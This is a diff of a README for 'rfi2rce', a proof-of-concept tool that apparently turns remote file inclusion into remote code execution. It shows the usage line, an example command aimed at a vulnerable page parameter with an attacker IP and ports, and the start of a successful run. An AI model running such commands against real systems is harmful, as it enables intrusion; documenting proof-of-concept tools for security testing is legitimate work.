@@ -1,14 +1,14 @@
 # rfi2rce
 Remote File Inclusion To Remote Code Execution (PoC)  
 
-```
+```zsh
 rfi2rce - Remote File Inclusion To Remote Code Execution v1.0 by 0bfxgh0st*
 Usage python3 rfi2rce <url> <attacker ip> <attacker port> <attacker server port>
 Example: python3 rfi2rce http://ghost.server/index.php?page= 10.0.2.15 1337 8080
 ```
 
 Successful connection example  
-```zsh
+```
 ┌──(root💀ghost)-[/home/ghost/rfi2rce]
 └─# python3 rfi2rce http://ghost.server/index.php?page= 10.0.2.15 1337 8080
 rfi2rce - Remote File Inclusion To Remote Code Execution v1.0 by 0bfxgh0st*
